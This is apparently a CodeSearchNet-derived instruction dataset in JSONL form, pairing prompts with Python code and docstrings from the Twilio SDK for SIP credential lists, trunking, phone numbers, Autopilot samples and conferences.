{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return CredentialListInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of CredentialListInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the credentials :returns: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialList :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialList", "response": "def credentials(self):\n        \"\"\"\n        Access the credentials\n\n        :returns: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialList\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialList\n        \"\"\"\n        if self._credentials is None:\n            self._credentials = CredentialList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                credential_list_sid=self._solution['sid'],\n            )\n        return self._credentials"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating an instance context for the credential list", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CredentialListContext for this CredentialListInstance\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.CredentialListContext\n        \"\"\"\n        if self._context is None:\n            self._context = CredentialListContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of YesterdayInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of YesterdayInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.yesterday.YesterdayInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.yesterday.YesterdayInstance\n        \"\"\"\n        return YesterdayInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a new TrunkInstance", "response": "def create(self, friendly_name=values.unset, domain_name=values.unset,\n               disaster_recovery_url=values.unset,\n               disaster_recovery_method=values.unset, recording=values.unset,\n               secure=values.unset, cnam_lookup_enabled=values.unset):\n        \"\"\"\n        Create a new TrunkInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode domain_name: The unique address you reserve on Twilio to which you route your SIP traffic\n        :param unicode disaster_recovery_url: The HTTP URL that we should call if an error occurs while sending SIP traffic towards your configured Origination URL\n        :param unicode disaster_recovery_method: The HTTP method we should use to call the disaster_recovery_url\n        :param TrunkInstance.RecordingSetting recording: The recording settings for the trunk\n        :param bool secure: Whether Secure Trunking is enabled for the trunk\n        :param bool cnam_lookup_enabled: Whether Caller ID Name (CNAM) lookup should be enabled for the trunk\n\n        :returns: Newly created TrunkInstance\n        :rtype: twilio.rest.trunking.v1.trunk.TrunkInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'DomainName': domain_name,\n            'DisasterRecoveryUrl': disaster_recovery_url,\n            'DisasterRecoveryMethod': disaster_recovery_method,\n            'Recording': recording,\n            'Secure': secure,\n            'CnamLookupEnabled': cnam_lookup_enabled,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TrunkInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the origination_urls :returns: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlList :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlList", "response": "def origination_urls(self):\n        \"\"\"\n        Access the origination_urls\n\n        :returns: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlList\n        :rtype: twilio.rest.trunking.v1.trunk.origination_url.OriginationUrlList\n        \"\"\"\n        if self._origination_urls is None:\n            self._origination_urls = OriginationUrlList(self._version, trunk_sid=self._solution['sid'], )\n        return self._origination_urls"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef credentials_lists(self):\n        if self._credentials_lists is None:\n            self._credentials_lists = CredentialListList(self._version, trunk_sid=self._solution['sid'], )\n        return self._credentials_lists", "response": "Access the credentials_lists\n\n        :returns: twilio.rest.trunking.v1.trunk.credential_list.CredentialListList\n        :rtype: twilio.rest.trunking.v1.trunk.credential_list.CredentialListList"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ip_access_control_lists(self):\n        if self._ip_access_control_lists is None:\n            self._ip_access_control_lists = IpAccessControlListList(\n                self._version,\n                trunk_sid=self._solution['sid'],\n            )\n        return self._ip_access_control_lists", "response": "Access the ip_access_control_lists\n\n        :returns: twilio.rest.trunking.v1.trunk.ip_access_control_list.IpAccessControlListList\n        :rtype: twilio.rest.trunking.v1.trunk.ip_access_control_list.IpAccessControlListList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the phone_numbers :returns: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberList :rtype: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberList", "response": "def phone_numbers(self):\n        \"\"\"\n        Access the phone_numbers\n\n        :returns: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberList\n        :rtype: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberList\n        \"\"\"\n        if self._phone_numbers is None:\n            self._phone_numbers = PhoneNumberList(self._version, trunk_sid=self._solution['sid'], )\n        return self._phone_numbers"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the terminating_sip_domains :returns: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainList :rtype: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainList", "response": "def terminating_sip_domains(self):\n        \"\"\"\n        Access the terminating_sip_domains\n\n        :returns: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainList\n        :rtype: twilio.rest.trunking.v1.trunk.terminating_sip_domain.TerminatingSipDomainList\n        \"\"\"\n        if self._terminating_sip_domains is None:\n            self._terminating_sip_domains = TerminatingSipDomainList(\n                self._version,\n                trunk_sid=self._solution['sid'],\n            )\n        return self._terminating_sip_domains"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an instance context for the crawler", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: TrunkContext for this TrunkInstance\n        :rtype: twilio.rest.trunking.v1.trunk.TrunkContext\n        \"\"\"\n        if self._context is None:\n            self._context = TrunkContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the TrunkInstance s related properties", "response": "def update(self, friendly_name=values.unset, domain_name=values.unset,\n               disaster_recovery_url=values.unset,\n               disaster_recovery_method=values.unset, recording=values.unset,\n               secure=values.unset, cnam_lookup_enabled=values.unset):\n        \"\"\"\n        Update the TrunkInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode domain_name: The unique address you reserve on Twilio to which you route your SIP traffic\n        :param unicode disaster_recovery_url: The HTTP URL that we should call if an error occurs while sending SIP traffic towards your configured Origination URL\n        :param unicode disaster_recovery_method: The HTTP method we should use to call the disaster_recovery_url\n        :param TrunkInstance.RecordingSetting recording: The recording settings for the trunk\n        :param bool secure: Whether Secure Trunking is enabled for the trunk\n        :param bool cnam_lookup_enabled: Whether Caller ID Name (CNAM) lookup should be enabled for the trunk\n\n        :returns: Updated TrunkInstance\n        :rtype: twilio.rest.trunking.v1.trunk.TrunkInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            domain_name=domain_name,\n            disaster_recovery_url=disaster_recovery_url,\n            disaster_recovery_method=disaster_recovery_method,\n            recording=recording,\n            secure=secure,\n            cnam_lookup_enabled=cnam_lookup_enabled,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self, credentials, friendly_name=values.unset,\n               account_sid=values.unset):\n        \"\"\"\n        Create a new AwsInstance\n\n        :param unicode credentials: A string that contains the AWS access credentials in the format <AWS_ACCESS_KEY_ID>:<AWS_SECRET_ACCESS_KEY>\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode account_sid: The Subaccount this Credential should be associated with.\n\n        :returns: Newly created AwsInstance\n        :rtype: twilio.rest.accounts.v1.credential.aws.AwsInstance\n        \"\"\"\n        data = values.of({\n            'Credentials': credentials,\n            'FriendlyName': friendly_name,\n            'AccountSid': account_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AwsInstance(self._version, payload, )", "response": "Create a new AwsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AwsContext for this AwsInstance\n        :rtype: twilio.rest.accounts.v1.credential.aws.AwsContext\n        \"\"\"\n        if self._context is None:\n            self._context = AwsContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef stream(self, area_code=values.unset, contains=values.unset,\n               sms_enabled=values.unset, mms_enabled=values.unset,\n               voice_enabled=values.unset,\n               exclude_all_address_required=values.unset,\n               exclude_local_address_required=values.unset,\n               exclude_foreign_address_required=values.unset, beta=values.unset,\n               near_number=values.unset, near_lat_long=values.unset,\n               distance=values.unset, in_postal_code=values.unset,\n               in_region=values.unset, in_rate_center=values.unset,\n               in_lata=values.unset, in_locality=values.unset,\n               fax_enabled=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams VoipInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode area_code: The area code of the phone numbers to read\n        :param unicode contains: The pattern on which to match phone numbers\n        :param bool sms_enabled: Whether the phone numbers can receive text messages\n        :param bool mms_enabled: Whether the phone numbers can receive MMS messages\n        :param bool voice_enabled: Whether the phone numbers can receive calls.\n        :param bool exclude_all_address_required: Whether to exclude phone numbers that require an Address\n        :param bool exclude_local_address_required: Whether to exclude phone numbers that require a local address\n        :param bool exclude_foreign_address_required: Whether to exclude phone numbers that require a foreign address\n        :param bool beta: Whether to read phone numbers new to the Twilio platform\n        :param unicode near_number: Given a phone number, find a geographically close number within distance miles. (US/Canada only)\n        :param unicode near_lat_long: Given a latitude/longitude pair lat,long find geographically close numbers within distance miles. (US/Canada only)\n        :param unicode distance: The search radius, in miles, for a near_ query. (US/Canada only)\n        :param unicode in_postal_code: Limit results to a particular postal code. (US/Canada only)\n        :param unicode in_region: Limit results to a particular region. (US/Canada only)\n        :param unicode in_rate_center: Limit results to a specific rate center, or given a phone number search within the same rate center as that number. (US/Canada only)\n        :param unicode in_lata: Limit results to a specific local access and transport area. (US/Canada only)\n        :param unicode in_locality: Limit results to a particular locality\n        :param bool fax_enabled: Whether the phone numbers can receive faxes\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.available_phone_number.voip.VoipInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            area_code=area_code,\n            contains=contains,\n            sms_enabled=sms_enabled,\n            mms_enabled=mms_enabled,\n            voice_enabled=voice_enabled,\n            exclude_all_address_required=exclude_all_address_required,\n            exclude_local_address_required=exclude_local_address_required,\n            exclude_foreign_address_required=exclude_foreign_address_required,\n            beta=beta,\n            near_number=near_number,\n            near_lat_long=near_lat_long,\n            distance=distance,\n            in_postal_code=in_postal_code,\n            in_region=in_region,\n            in_rate_center=in_rate_center,\n            in_lata=in_lata,\n            in_locality=in_locality,\n            fax_enabled=fax_enabled,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams VoipInstance records from the API as a generator stream."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an instance of VoipInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of VoipInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.voip.VoipInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.voip.VoipInstance\n        \"\"\"\n        return VoipInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            country_code=self._solution['country_code'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self, sid):\n        return TranscriptionContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a TranscriptionContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.transcription.TranscriptionContext\n        :rtype: twilio.rest.api.v2010.account.transcription.TranscriptionContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstreams the SampleInstance records from the API as a list.", "response": "def list(self, language=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists SampleInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode language: The ISO language-country string that specifies the language used for the sample\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.autopilot.v1.assistant.task.sample.SampleInstance]\n        \"\"\"\n        return list(self.stream(language=language, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a new SampleInstance", "response": "def create(self, language, tagged_text, source_channel=values.unset):\n        \"\"\"\n        Create a new SampleInstance\n\n        :param unicode language: The ISO language-country string that specifies the language used for the new sample\n        :param unicode tagged_text: The text example of how end users might express the task\n        :param unicode source_channel: The communication channel from which the new sample was captured\n\n        :returns: Newly created SampleInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.sample.SampleInstance\n        \"\"\"\n        data = values.of({'Language': language, 'TaggedText': tagged_text, 'SourceChannel': source_channel, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SampleInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a SampleContext :param sid: The unique string that identifies the resource :returns: twilio.rest.autopilot.v1.assistant.task.sample.SampleContext :rtype: twilio.rest.autopilot.v1.assistant.task.sample.SampleContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a SampleContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.sample.SampleContext\n        :rtype: twilio.rest.autopilot.v1.assistant.task.sample.SampleContext\n        \"\"\"\n        return SampleContext(\n            self._version,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return SampleInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )", "response": "Build an instance of SampleInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SampleInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a SampleInstance\n\n        :returns: Fetched SampleInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.sample.SampleInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate the SampleInstance resource.", "response": "def update(self, language=values.unset, tagged_text=values.unset,\n               source_channel=values.unset):\n        \"\"\"\n        Update the SampleInstance\n\n        :param unicode language: The ISO language-country string that specifies the language used for the sample\n        :param unicode tagged_text: The text example of how end users might express the task\n        :param unicode source_channel: The communication channel from which the sample was captured\n\n        :returns: Updated SampleInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.sample.SampleInstance\n        \"\"\"\n        return self._proxy.update(language=language, tagged_text=tagged_text, source_channel=source_channel, )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef records(self):\n        if self._records is None:\n            self._records = RecordList(self._version, account_sid=self._solution['account_sid'], )\n        return self._records", "response": "Access the records\n\n        :returns: twilio.rest.api.v2010.account.usage.record.RecordList\n        :rtype: twilio.rest.api.v2010.account.usage.record.RecordList"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef triggers(self):\n        if self._triggers is None:\n            self._triggers = TriggerList(self._version, account_sid=self._solution['account_sid'], )\n        return self._triggers", "response": "Access the triggers\n\n        :returns: twilio.rest.api.v2010.account.usage.trigger.TriggerList\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return UsageInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of UsageInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef request(self, method, uri, params=None, data=None, headers=None,\n                auth=None, timeout=None, allow_redirects=False):\n        \"\"\"\n        Make an HTTP request.\n        \"\"\"\n        url = self.relative_uri(uri)\n        return self.domain.request(\n            method,\n            url,\n            params=params,\n            data=data,\n            headers=headers,\n            auth=auth,\n            timeout=timeout,\n            allow_redirects=allow_redirects\n        )", "response": "Make an HTTP request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nwrap an exceptional response in a TwilioRestException.", "response": "def exception(cls, method, uri, response, message):\n        \"\"\"\n        Wraps an exceptional response in a `TwilioRestException`.\n        \"\"\"\n        # noinspection PyBroadException\n        try:\n            error_payload = json.loads(response.text)\n            if 'message' in error_payload:\n                message = '{}: {}'.format(message, error_payload['message'])\n            code = error_payload.get('code', response.status_code)\n            return TwilioRestException(response.status_code, uri, message, code, method)\n        except Exception:\n            return TwilioRestException(response.status_code, uri, message, response.status_code, method)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef read_limits(self, limit=None, page_size=None):\n        page_limit = values.unset\n\n        if limit is not None:\n\n            if page_size is None:\n                page_size = limit\n\n            page_limit = int(ceil(limit / float(page_size)))\n\n        return {\n            'limit': limit or values.unset,\n            'page_size': page_size or values.unset,\n            'page_limit': page_limit,\n        }", "response": "Takes a limit on the max number of records to read and a max page_size\n            and calculates the max number of pages to read."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nmake an HTTP request.", "response": "def page(self, method, uri, params=None, data=None, headers=None, auth=None, timeout=None,\n             allow_redirects=False):\n        \"\"\"\n        Makes an HTTP request.\n        \"\"\"\n        return self.request(\n            method,\n            uri,\n            params=params,\n            data=data,\n            headers=headers,\n            auth=auth,\n            timeout=timeout,\n            allow_redirects=allow_redirects,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate records one a time from a page.", "response": "def stream(self, page, limit=None, page_limit=None):\n        \"\"\"\n        Generates records one a time from a page, stopping at prescribed limits.\n\n        :param Page page: The page to stream.\n        :param int limit: The max number of records to read.\n        :param int page_imit: The max number of pages to read.\n        \"\"\"\n        current_record = 1\n        current_page = 1\n\n        while page is not None:\n            for record in page:\n                yield record\n                current_record += 1\n                if limit and limit is not values.unset and limit < current_record:\n                    return\n\n            if page_limit and page_limit is not values.unset and page_limit < current_page:\n                return\n\n            page = page.next_page()\n            current_page += 1"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new resource instance.", "response": "def create(self, method, uri, params=None, data=None, headers=None, auth=None, timeout=None,\n               allow_redirects=False):\n        \"\"\"\n        Create a resource instance.\n        \"\"\"\n        response = self.request(\n            method,\n            uri,\n            params=params,\n            data=data,\n            headers=headers,\n            auth=auth,\n            timeout=timeout,\n            allow_redirects=allow_redirects,\n        )\n\n        if response.status_code < 200 or response.status_code >= 300:\n            raise self.exception(method, uri, response, 'Unable to create record')\n\n        return json.loads(response.text)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstream ConferenceInstance records from the API as a generator. This operation lazily loads records as efficiently as possible until limit is reached.", "response": "def stream(self, date_created_before=values.unset, date_created=values.unset,\n               date_created_after=values.unset, date_updated_before=values.unset,\n               date_updated=values.unset, date_updated_after=values.unset,\n               friendly_name=values.unset, status=values.unset, limit=None,\n               page_size=None):\n        \"\"\"\n        Streams ConferenceInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param date date_created_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created_after: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated_after: The `YYYY-MM-DD` value of the resources to read\n        :param unicode friendly_name: The string that identifies the Conference resources to read\n        :param ConferenceInstance.Status status: The status of the resources to read\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.conference.ConferenceInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            date_created_before=date_created_before,\n            date_created=date_created,\n            date_created_after=date_created_after,\n            date_updated_before=date_updated_before,\n            date_updated=date_updated,\n            date_updated_after=date_updated_after,\n            friendly_name=friendly_name,\n            status=status,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list(self, date_created_before=values.unset, date_created=values.unset,\n             date_created_after=values.unset, date_updated_before=values.unset,\n             date_updated=values.unset, date_updated_after=values.unset,\n             friendly_name=values.unset, status=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists ConferenceInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param date date_created_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created_after: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated_after: The `YYYY-MM-DD` value of the resources to read\n        :param unicode friendly_name: The string that identifies the Conference resources to read\n        :param ConferenceInstance.Status status: The status of the resources to read\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.conference.ConferenceInstance]\n        \"\"\"\n        return list(self.stream(\n            date_created_before=date_created_before,\n            date_created=date_created,\n            date_created_after=date_created_after,\n            date_updated_before=date_updated_before,\n            date_updated=date_updated,\n            date_updated_after=date_updated_after,\n            friendly_name=friendly_name,\n            status=status,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams ConferenceInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving a single page of ConferenceInstance records from the API. This operation is executed immediately by the API.", "response": "def page(self, date_created_before=values.unset, date_created=values.unset,\n             date_created_after=values.unset, date_updated_before=values.unset,\n             date_updated=values.unset, date_updated_after=values.unset,\n             friendly_name=values.unset, status=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of ConferenceInstance records from the API.\n        Request is executed immediately\n\n        :param date date_created_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created_after: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated: The `YYYY-MM-DD` value of the resources to read\n        :param date date_updated_after: The `YYYY-MM-DD` value of the resources to read\n        :param unicode friendly_name: The string that identifies the Conference resources to read\n        :param ConferenceInstance.Status status: The status of the resources to read\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferencePage\n        \"\"\"\n        params = values.of({\n            'DateCreated<': serialize.iso8601_date(date_created_before),\n            'DateCreated': serialize.iso8601_date(date_created),\n            'DateCreated>': serialize.iso8601_date(date_created_after),\n            'DateUpdated<': serialize.iso8601_date(date_updated_before),\n            'DateUpdated': serialize.iso8601_date(date_updated),\n            'DateUpdated>': serialize.iso8601_date(date_updated_after),\n            'FriendlyName': friendly_name,\n            'Status': status,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ConferencePage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a ConferenceContext :param sid: The unique string that identifies this resource :returns: twilio.rest.api.v2010.account.conference.ConferenceContext :rtype: twilio.rest.api.v2010.account.conference.ConferenceContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ConferenceContext\n\n        :param sid: The unique string that identifies this resource\n\n        :returns: twilio.rest.api.v2010.account.conference.ConferenceContext\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceContext\n        \"\"\"\n        return ConferenceContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of ConferenceInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ConferenceInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.conference.ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceInstance\n        \"\"\"\n        return ConferenceInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, status=values.unset, announce_url=values.unset,\n               announce_method=values.unset):\n        \"\"\"\n        Update the ConferenceInstance\n\n        :param ConferenceInstance.UpdateStatus status: The new status of the resource\n        :param unicode announce_url: The URL we should call to announce something into the conference\n        :param unicode announce_method: he HTTP method used to call announce_url\n\n        :returns: Updated ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceInstance\n        \"\"\"\n        data = values.of({'Status': status, 'AnnounceUrl': announce_url, 'AnnounceMethod': announce_method, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ConferenceInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the ConferenceInstance\n\n        :param ConferenceInstance.UpdateStatus status: The new status of the resource\n        :param unicode announce_url: The URL we should call to announce something into the conference\n        :param unicode announce_method: he HTTP method used to call announce_url\n\n        :returns: Updated ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the participants :returns: twilio.rest.api.v2010.account.conference.participant.ParticipantList :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantList", "response": "def participants(self):\n        \"\"\"\n        Access the participants\n\n        :returns: twilio.rest.api.v2010.account.conference.participant.ParticipantList\n        :rtype: twilio.rest.api.v2010.account.conference.participant.ParticipantList\n        \"\"\"\n        if self._participants is None:\n            self._participants = ParticipantList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                conference_sid=self._solution['sid'],\n            )\n        return self._participants"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the recordings :returns: twilio.rest.api.v2010.account.conference.recording.RecordingList :rtype: twilio.rest.api.v2010.account.conference.recording.RecordingList", "response": "def recordings(self):\n        \"\"\"\n        Access the recordings\n\n        :returns: twilio.rest.api.v2010.account.conference.recording.RecordingList\n        :rtype: twilio.rest.api.v2010.account.conference.recording.RecordingList\n        \"\"\"\n        if self._recordings is None:\n            self._recordings = RecordingList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                conference_sid=self._solution['sid'],\n            )\n        return self._recordings"}
